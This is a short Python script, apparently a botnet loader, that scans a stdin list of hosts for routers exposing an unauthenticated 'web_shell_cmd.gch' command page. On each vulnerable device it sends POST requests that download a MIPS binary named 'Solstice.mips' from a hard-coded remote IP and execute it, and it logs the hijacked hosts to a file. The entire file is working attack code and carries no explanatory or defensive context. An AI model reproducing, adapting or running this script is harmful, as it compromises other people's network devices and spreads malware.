#!/usr/bin/python
#Phat hax
import sys
import requests
import threading
import time
from datetime import datetime

appended_hosts = []

copyFile = {
    "Cmd": "cp /etc/init.norm /var/tmp/", "CmdAck": "", "IF_ACTION": "apply",
    "IF_ERRORPARAM": "SUCC", "IF_ERRORSTR": "SUCC", "IF_ERRORTYPE": "-1"
}

wgetFile = {
    "Cmd": "wget http://185.244.25.108/bins/Solstice.mips -O /var/tmp/init.norm", "CmdAck": "", "IF_ACTION": "apply",
    "IF_ERRORPARAM": "SUCC", "IF_ERRORSTR": "SUCC", "IF_ERRORTYPE": "-1"
}

execFile = {
    "Cmd": "/var/tmp/init.norm", "CmdAck": "", "IF_ACTION": "apply",
    "IF_ERRORPARAM": "SUCC", "IF_ERRORSTR": "SUCC", "IF_ERRORTYPE": "-1"
}

class ExecutePost(object):

	def __init__(self, host, RwPerms, wgetClient, execClient):
		self.host = host
		self.RwPerms = RwPerms
		self.wgetClient = wgetClient 
		self.execClient = execClient
		sys.stdout.write("[%s] [%s] executing post request\n" % (datetime.now(), self.host))
		try:
			getRwPerm = requests.post(self.host, data=self.RwPerms)
			wgetReq = requests.post(self.host, data=self.wgetClient)
			execReq = requests.post(self.host, data=self.execClient)
			print(execReq.content)

		except KeyboardInterrupt:
			file = open("output.result", "a")
			for _iter in appended_hosts:
				file.write(_iter + "\n")
			sys.exit("[%s] exited due to user cancel\n" % (datetime.now()))

		except Exception as ex:
			sys.stdout.write("[%s] %s\n" % (datetime.now(), str(ex)))
			return	

class CheckShell(object):

	def __init__(self, host):
		self.host = "http://" + host + "/web_shell_cmd.gch"

		try:
			result = requests.get(self.host).text
			if("H108N" in result):
				sys.stdout.write("[%s] [%s] found active shell!\n" % (datetime.now(), host))
				appended_hosts.append(host)
			else:
				sys.stdout.write("[%s] [%s] no active shell!\n" % (datetime.now(), host))
				return
				
			ExecutePost(host=self.host, RwPerms=copyFile, wgetClient=wgetFile, execClient=execFile)
			return

		except KeyboardInterrupt:
			file = open("output.result", "a")
			for _iter in appended_hosts:
				file.write(_iter + "\n")
			sys.exit("[%s] exited due to user cancel\n" % (datetime.now()))

		except Exception as ex:
			sys.stdout.write("[%s] %s\n" % (datetime.now(), str(ex)))
			return	

for _iterstdin in sys.stdin.readlines():
	threading.Thread(target=CheckShell, args=(_iterstdin.strip(),)).start()
